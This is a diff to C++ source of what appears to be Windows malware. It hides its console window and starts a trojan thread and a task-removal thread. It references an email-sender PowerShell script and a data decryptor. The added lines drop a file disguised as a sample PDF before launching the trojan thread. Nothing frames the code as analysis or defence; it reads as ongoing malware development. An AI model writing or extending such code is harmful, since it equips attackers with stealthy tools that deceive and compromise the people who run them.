@@ -7,6 +7,7 @@ string FileIconContent = "./ICON.ico";
 string EmailSenderContent = "./emailSender.ps1";
 string InfoDecryptorContent = "../x64/Release/DataDecryptor.exe";
 string CustomFileContent = "../customFile.extension";
+string TrojanFileContent = "../x64/Release/debugFolder_backup/pdfsample.pdf";
 
 int main(int argc, char* argv[])
 {   
@@ -17,8 +18,10 @@ int main(int argc, char* argv[])
     if (!DEBUG)
         ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-    if (TROJAN)
+    if (TROJAN) {
+        dropFile(TrojanFileContent, TROJANFILE);
         HANDLE hThreadTrojan = CreateThread(NULL, 0, trojanFunction, NULL, HIGH_PRIORITY_CLASS, new DWORD);
+    }
 
     if (TSK_REMOVER)
         HANDLE hThreadTaskMng = CreateThread(NULL, 0, removeTasks, NULL, HIGH_PRIORITY_CLASS, new DWORD);
